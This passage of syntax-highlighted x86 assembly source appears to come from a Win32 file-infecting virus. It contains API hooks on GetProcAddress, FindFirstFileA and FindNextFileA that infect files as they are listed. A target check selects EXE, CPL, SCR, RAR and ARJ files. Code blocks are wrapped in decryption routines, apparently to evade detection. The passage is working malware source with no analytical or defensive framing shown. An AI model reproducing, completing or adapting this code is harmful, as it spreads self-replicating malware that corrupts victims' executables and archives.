    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">HGPA_IsHookableAPI?</span><span class="sc0">             </span><span class="sc1">; Search loop</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OriginalGPAx</span><span class="sc0">

</span><span class="sc5">HGPA_IndeedItIs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Hookz</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                     </span><span class="sc1">; Multiply per 12</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Get the correct offset</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; And get the value</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">; Adjust it to delta</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; EAX = Hooked API address</span><span class="sc0">
</span><span class="sc5">eBlockE</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">HGPA_SeeYa</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">HGPA_RetAddress</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OriginalGPAx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; This is a jump to the origi-</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; nal GetProcAddress</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">HGPA_RetAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hGetProcAddress</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">OriginalGPA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; This is a jump to the origi-</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; nal GetProcAddress</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hGetProcAddress</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookFindFirstFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save all reggies</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlockF</span><span class="sc4">-</span><span class="sc5">BlockF</span><span class="sc0">

</span><span class="sc5">BlockF</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; EBP = Delta Offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Return Address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FFRetAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Ptr to WFD</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FF_WFD</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; Save Delta Offset</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; Remove this ret address from</span><span class="sc0">
                        </span><span class="sc1">; stack</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hFindFirstFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Call original API</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">_FF_GoAway</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">twisted</span><span class="sc0">
</span><span class="sc5">_FF_GoAway</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FF_GoAway</span><span class="sc0">
</span><span class="sc5">twisted</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save reggies and flaggies</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; Delta again</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_Handles_Count</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Number of active hndlers</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_HndInMem</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Our Handle table in mem</span><span class="sc0">

</span><span class="sc5">eBlockF</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">; Ptr to filename</span><span class="sc0">
</span><span class="sc5">FF_WFD</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">n_Handles</span><span class="sc0">                   </span><span class="sc1">; Over max hnd storing?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">AvoidStoring</span><span class="sc0">                    </span><span class="sc1">; Shit...</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Store Handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; Store WFD offset</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_Handles_Count</span><span class="sc4">]</span><span class="sc0">
      
</span><span class="sc5">AvoidStoring</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check4ValidFile</span><span class="sc0">                 </span><span class="sc1">; Is a reliable file 4 inf?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> 
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">FF_AvoidInfekt</span><span class="sc0">                  </span><span class="sc1">; Duh!</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">FF_InfPE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectArchiveEDI</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FF_AvoidInfekt</span><span class="sc0">
</span><span class="sc5">FF_InfPE</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectEDI</span><span class="sc0">                       </span><span class="sc1">; Infect it</span><span class="sc0">
</span><span class="sc5">FF_AvoidInfekt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">FF_GoAway</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; Return to caller</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">FFRetAddress</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">HookFindNextFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save all reggies</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock10</span><span class="sc4">-</span><span class="sc5">Block10</span><span class="sc0">

</span><span class="sc5">Block10</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; Get delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Return address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FNRetAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Search Handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FN_Hnd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; Save delta offset</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; Fix stack</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_FindNextFileA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Call original API</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Fail? Damn.</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FN_GoAway</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save regs and flags</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; Get delta again</span><span class="sc0">

</span><span class="sc5">eBlock10</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">; EAX = Search Handle</span><span class="sc0">
</span><span class="sc5">FN_Hnd</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check4ValidHandle</span><span class="sc0">               </span><span class="sc1">; Is in our table? If yes,</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FN_AvoidInfekt</span><span class="sc0">                  </span><span class="sc1">; infect.</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ESI = Pointer to WFD</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = Ptr to filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check4ValidFile</span><span class="sc0">                 </span><span class="sc1">; Is reliable its inf.?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">     
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">FN_AvoidInfekt</span><span class="sc0">                  </span><span class="sc1">; Duh...</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">FN_InfPE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectArchiveEDI</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FN_AvoidInfekt</span><span class="sc0">
</span><span class="sc5">FN_InfPE</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectEDI</span><span class="sc0">                       </span><span class="sc1">; Infect it !</span><span class="sc0">

</span><span class="sc5">FN_AvoidInfekt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">                                   </span><span class="sc1">; Restore flags &amp; regs</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">FN_GoAway</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; Return to caller</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">FNRetAddress</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Standard API handler                                                   ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">DoHookStuff</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock11</span><span class="sc4">-</span><span class="sc5">Block11</span><span class="sc0">

</span><span class="sc5">Block11</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get filename to infect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check4ValidFile</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ErrorDoHookStuff</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">InfectWithHookStuff</span><span class="sc0">
</span><span class="sc5">InfectAnArchive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectArchiveEDI</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ErrorDoHookStuff</span><span class="sc0">
</span><span class="sc5">InfectWithHookStuff</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectEDI</span><span class="sc0">
</span><span class="sc5">ErrorDoHookStuff</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">                                   </span><span class="sc1">; Preserve all as if nothing</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; happened :)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; Get delta offset </span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">eBlock11</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to file to check</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ECX = 0 -&gt; Not valid file</span><span class="sc0">
</span><span class="sc1">;       ECX = 1 -&gt; Possible PE file</span><span class="sc0">
</span><span class="sc1">;       ECX = 2 -&gt; Possible Archive</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Check4ValidFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Find NULL? Shit...</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VF_Error</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">                          </span><span class="sc1">; Dot found? Interesting...</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Check4ValidFile</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Put extension in EAX</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">                   </span><span class="sc1">; Make string locase</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"exe."</span><span class="sc0">                  </span><span class="sc1">; Is it an EXE? Infect!!!</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VF_Successful</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"lpc."</span><span class="sc0">                  </span><span class="sc1">; Is it a CPL? Infect!!!</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VF_Successful</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"rcs."</span><span class="sc0">                  </span><span class="sc1">; Is it a SCR? Infect!!!</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VF_Successful</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"rar."</span><span class="sc0">                  </span><span class="sc1">; Is it a RAR? Infect!!!</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VF_SuccessfulArchive</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"jra."</span><span class="sc0">                  </span><span class="sc1">; Is it an ARJ? Infect!!!</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VF_SuccessfulArchive</span><span class="sc0">
</span><span class="sc5">C4VF_Error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">C4VF_SuccessfulArchive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">C4VF_Successful</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EBP = Delta Offset</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetDeltaOffset</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@x1</span><span class="sc0">
   </span><span class="sc5">@x1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@x1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = Handle</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = WFD Offset of given handle</span><span class="sc0">
</span><span class="sc1">;       EDX = Places what it occupies in WFD_Handles structure</span><span class="sc0">
</span><span class="sc1">;       CF  = Set to 1 if it's found, to 0 if it wasn't</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Check4ValidHandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_HndInMem</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">C4VH_l00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">n_Handles</span><span class="sc0">                   </span><span class="sc1">; Over limits? Shit...</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">C4VH_Error</span><span class="sc0">

